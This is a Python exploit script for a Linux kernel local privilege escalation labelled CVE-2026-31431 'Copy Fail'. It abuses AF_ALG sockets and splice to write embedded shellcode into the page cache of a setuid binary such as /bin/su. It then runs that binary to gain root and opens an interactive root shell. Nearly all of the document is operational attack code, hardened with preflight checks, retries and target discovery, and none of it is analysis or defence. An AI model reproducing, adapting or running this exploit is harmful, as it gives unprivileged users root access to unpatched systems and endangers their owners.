#!/usr/bin/env python3
"""
CVE-2026-31431 "Copy Fail" - Enhanced Local Privilege Escalation Exploit
Targets: /bin/su by default (configurable via --target)

Original PoC by Theori (732 bytes). This version adds:
  - Pre-flight vulnerability & compatibility checks
  - Automatic target discovery with fallback
  - Command-line override for target path
  - VM cache drop before exploit for clean page cache state
  - Chunk-level retry logic with exponential back-off
  - Progress indicator and detailed logging
  - Post-exploit verification + automatic root shell
  - Graceful signal handling and cleanup

Prerequisites:
  - Python 3.10+ (os.splice support)
  - Vulnerable Linux kernel with AF_ALG enabled (4.13+ through fixed versions)
  - Read access to a setuid binary (su, sudo, etc.)

Usage:
  python3 copy_fail_exploit.py
  python3 copy_fail_exploit.py --target /usr/bin/su
  python3 copy_fail_exploit.py --target /bin/sudo --verbose
"""

import os
import sys
import zlib
import socket
import time
import signal
import argparse

# ---------------------------------------------------------------------------
# Kernel constants
# ---------------------------------------------------------------------------
AF_ALG = 38
SOCK_SEQPACKET = 5
SOL_ALG = 279
MSG_MORE = 32768  # 0x8000

DEFAULT_TARGETS = ("/bin/su", "/usr/bin/su")


def hexbytes(s):
    """Convert hex string to bytes"""
    return bytes.fromhex(s)


def find_target(preferred=None):
    """Locate a usable setuid binary to patch in page cache."""
    candidates = []
    if preferred:
        candidates.append(preferred)
    candidates.extend(DEFAULT_TARGETS)

    for path in candidates:
        if os.path.exists(path):
            mode = os.stat(path).st_mode
            if mode & 0o4000:
                print("[*] Setuid target selected: {} (mode={})".format(path, oct(mode)))
                return path
            print("[!] {} exists but is NOT setuid ({})".format(path, oct(mode)))
    print("[-] FATAL: No suitable setuid target found.")
    sys.exit(1)


def preflight_checks(verbose=False):
    """Verify host looks exploitable without triggering the bug."""
    print("[*] Running pre-flight checks ...")

    if sys.version_info < (3, 10):
        print("[-] Python {}.{} too old (need 3.10+).".format(
            sys.version_info.major, sys.version_info.minor))
        return False
    if verbose:
        print("[+] Python {}.{}.{}".format(
            sys.version_info.major, sys.version_info.minor, sys.version_info.micro))

    try:
        release = os.uname().release
        print("[*] Kernel release: {}".format(release))
    except Exception:
        pass

    try:
        probe = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
        probe.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        probe.close()
    except OSError as exc:
        print("[-] AF_ALG probe failed: {}".format(exc))
        print("    Kernel may be patched or AF_ALG is disabled (initcall_blacklist?).")
        return False

    if verbose:
        print("[+] AF_ALG socket probe succeeded.")
    return True


def build_payload():
    """Return the zlib-compressed shellcode from original PoC."""
    compressed = (
        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d1"
        "6999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff5936"
        "11fcacfa499979fac5190c0c0c0032c310d3"
    )
    return zlib.decompress(hexbytes(compressed))


def drop_vm_caches():
    """Attempt to drop page caches so we write into fresh cache pages."""
    try:
        os.system("sync")
        with open("/proc/sys/vm/drop_caches", "wb") as f:
            f.write(b"3\n")
        return True
    except (PermissionError, OSError):
        return False


def write4(target_fd, offset, chunk, max_retries=3):
    """
    CVE-2026-31431 primitive.
    Corrupts 4 bytes at offset within the page cache backing target_fd.
    """
    assert len(chunk) == 4

    for attempt in range(1, max_retries + 1):
        alg_sock = None
        req_sock = None
        r_fd = w_fd = -1
        try:
            alg_sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
            alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

            key = hexbytes('0800010000000010' + '0' * 64)
            alg_sock.setsockopt(SOL_ALG, 1, key)
            alg_sock.setsockopt(SOL_ALG, 5, None, 4)

            req_sock, _ = alg_sock.accept()

            total_len = offset + 4
            zero = hexbytes('00')

            aad = b"A" * 4 + chunk
            cmsg_list = [
                (SOL_ALG, 3, zero * 4),
                (SOL_ALG, 2, b'\x10' + zero * 19),
                (SOL_ALG, 4, b'\x08' + zero * 3),
            ]
            req_sock.sendmsg([aad], cmsg_list, MSG_MORE)

            r_fd, w_fd = os.pipe()
            os.splice(target_fd, w_fd, total_len, offset_src=0)
            os.splice(r_fd, req_sock.fileno(), total_len)

            try:
                req_sock.recv(8 + offset)
            except Exception:
                pass

            return True

        except OSError as exc:
            if attempt == max_retries:
                print("[-] write4(offset={}) failed after {} attempts: {}".format(
                    offset, max_retries, exc))
                return False
            time.sleep(0.05 * attempt)
        finally:
            for fd in (r_fd, w_fd):
                if fd >= 0:
                    try:
                        os.close(fd)
                    except Exception:
                        pass
            for sock in (req_sock, alg_sock):
                if sock is not None:
                    try:
                        sock.close()
                    except Exception:
                        pass
    return False


def exploit(target_path, verbose=False):
    payload = build_payload()
    payload_len = len(payload)
    num_chunks = (payload_len + 3) // 4
    print("[*] Payload size: {} bytes ({} chunks)".format(payload_len, num_chunks))

    fd = os.open(target_path, os.O_RDONLY)
    try:
        print("[*] Injecting into page cache of {} ...".format(target_path))
        for i in range(0, payload_len, 4):
            chunk = payload[i:i + 4]
            if len(chunk) < 4:
                chunk = chunk + b'\x00' * (4 - len(chunk))

            ok = write4(fd, i, chunk)
            if not ok:
                print("[-] Exploit failed at chunk {}/{}.".format(i // 4 + 1, num_chunks))
                return False

            if verbose and (i // 4) % 8 == 7:
                print("    ... injected chunk {}/{}".format(i // 4 + 1, num_chunks))

            if (i // 4) % 4 == 3:
                time.sleep(0.02)

        print("[+] Payload injection complete ({} chunks written).".format(num_chunks))
    finally:
        os.close(fd)

    print("[*] Executing {} to trigger payload ...".format(target_path))
    ret = os.system(target_path)
    if ret != 0:
        print("[!] '{}' exited with code {}, shellcode may still have fired.".format(
            target_path, ret))

    if os.geteuid() == 0:
        print("[+] SUCCESS: Running as root.")
        return True
    else:
        print("[-] Not root. Target may be patched or payload incompatible with this binary.")
        return False


def spawn_root_shell():
    print("[*] Spawning interactive root shell ...")
    env = os.environ.copy()
    env["PS1"] = r"[root@copy-fail \W]# "
    for sh in ("/bin/bash", "/bin/sh"):
        if os.path.exists(sh):
            os.execve(sh, [sh, "-i"], env)
    os.system("/bin/sh -i")


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-31431 Copy Fail - Local Privilege Escalation"
    )
    parser.add_argument(
        "--target", "-t",
        default=None,
        help="Override target setuid binary path (default: /bin/su or /usr/bin/su)"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose chunk-level progress output"
    )
    parser.add_argument(
        "--no-drop-caches",
        action="store_true",
        help="Skip dropping VM caches before exploit"
    )
    args = parser.parse_args()

    def on_sigint(signum, frame):
        print("\n[!] Interrupted by user.")
        sys.exit(130)
    signal.signal(signal.SIGINT, on_sigint)

    print("=" * 65)
    print("  CVE-2026-31431  |  Copy Fail  |  Local Privilege Escalation")
    print("=" * 65)

    if not preflight_checks(verbose=args.verbose):
        sys.exit(1)

    target = find_target(preferred=args.target)

    try:
        rel = os.uname().release
        parts = rel.split(".")
        major = int(parts[0])
        minor = int(parts[1]) if len(parts) > 1 else 0
        patch = 0
        if len(parts) > 2:
            patch_str = parts[2].split("-")[0].split("+")[0]
            patch = int(patch_str) if patch_str.isdigit() else 0

        looks_patched = (
            major >= 7
            or (major == 6 and minor >= 19 and patch >= 12)
            or (major == 6 and minor == 18 and patch >= 22)
        )
        if looks_patched:
            print("[!] WARNING: Kernel {} appears patched (>= 6.19.12 / >= 6.18.22 / >= 7.0).".format(rel))
    except Exception:
        pass

    if not args.no_drop_caches:
        if drop_vm_caches():
            print("[*] VM caches dropped (sync + drop_caches=3).")
        else:
            print("[!] Could not drop VM caches (need CAP_SYS_ADMIN or root); continuing anyway.")
        time.sleep(0.3)

    success = exploit(target, verbose=args.verbose)
    if success:
        spawn_root_shell()
    else:
        print("[-] Exploit unsuccessful.")
        sys.exit(1)


if __name__ == "__main__":
    main()
